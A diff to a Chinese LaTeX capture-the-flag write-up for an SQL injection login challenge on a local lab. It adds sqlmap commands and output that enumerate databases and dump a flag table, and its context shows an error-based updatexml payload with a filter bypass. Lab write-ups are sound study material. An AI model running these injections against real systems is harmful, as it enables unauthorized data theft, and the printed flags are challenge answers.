@@ -106,6 +106,7 @@ n1book{union_select_is_so_cool}
 \subsection{SQL注入-2}
 题目描述：请访问 http://127.0.0.1/login.php\ http://127.0.0.1/user.php
 
+\subsubsection{手动注入}
 访问login界面是一个输入账户名和密码的界面，访问user界面提示未登录。在login界面随便试了一下发现有一个admin账户，但是试不出来密码。
 打开源码有提示让在URL里面加上'?tips=1'，然后可以通过burp查看mysql报错信息。按提示打开后，在burp中拦截发送的包，发送后并没有回复包里看到报错信息，如图~\ref{fig:pic2}。
 \begin{figure}[H]
@@ -171,8 +172,65 @@ admin' or updatexml(1,concat(0x7e,(selselectect group_concat(flag) from fl4g)),1
 
 PS:最后用同样的方法获得了admin的密码，但是结果是一串长字符串，并不能登陆进去。
 
+\subsubsection{sqlmap注入}
+手动注入需要记的东西太多了，先用burp截获请求包，保存到post.txt，然后对name进行注入：
+\begin{lstlisting}
+python sqlmap.py -r ./post.txt -p name --dbs
+\end{lstlisting}
+最后需要进行一些选项，最后进行了时间盲注猜数据库名，这个步骤很慢。然后猜解出数据库:
+\begin{lstlisting}
+available databases [4]:
+    [*] information_schema
+    [*] mysql
+    [*] note
+    [*] performance_schema
+\end{lstlisting}
+
+看不出flag在哪里，那先看一下当前是哪个数据库:
+\begin{lstlisting}
+python sqlmap.py -r ./post.txt -p name --current-db
+\end{lstlisting}
+得到当前数据库是note，那再看note里面有什么表：
+\begin{lstlisting}
+python sqlmap.py -r ./post.txt -p name --tables -D "note"
+#结果:
+[11:19:10] [INFO] fetching number of tables for database 'note'
+[11:19:10] [INFO] resumed: 2
+[11:19:10] [INFO] resumed: fl4g
+[11:19:10] [INFO] resumed: users
+\end{lstlisting}
+继续猜fl4g的列名:
+\begin{lstlisting}
+python sqlmap.py -r ./post.txt -p name --columns -T "fl4g" -D "note"
+#结果:
+Database: note
+Table: fl4g
+[1 column]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| flag   | varchar(40) |
++--------+-------------+
+\end{lstlisting}
+
+ok，继续脱裤拿flag:
+\begin{lstlisting}
+python sqlmap.py -r ./post.txt -p name  --dump -C "flag" -T "fl4g" -D "note"
+结果:
+Database: note
+Table: fl4g
+[1 entry]
++----------------------------+
+| flag                       |
++----------------------------+
+| n1book{login_sqli_is_nice} |
++----------------------------+
+\end{lstlisting}
+
+flag到手。
+
 \subsection{小结}
-SQL是比较复杂的注入，首先要判断注入类型、注入点，然后才能开展注入。至于怎么判断类型、怎么从回显报错信息等得到更多信息，都是经验之谈，需要多做题积累。
+SQL是比较复杂的注入，首先要判断注入类型、注入点，然后才能开展注入。至于怎么判断类型、怎么从回显报错信息等得到更多信息，都是经验之谈，需要多做题积累。暴力的可以直接用sqlmap，不过比较慢，等起来很烦，但是总时间应该比手动注入要短。
 
 \begin{itemize}
     \item 符号小结：单引号\%27，双引号\%22,空格\%20,丼号\%23。
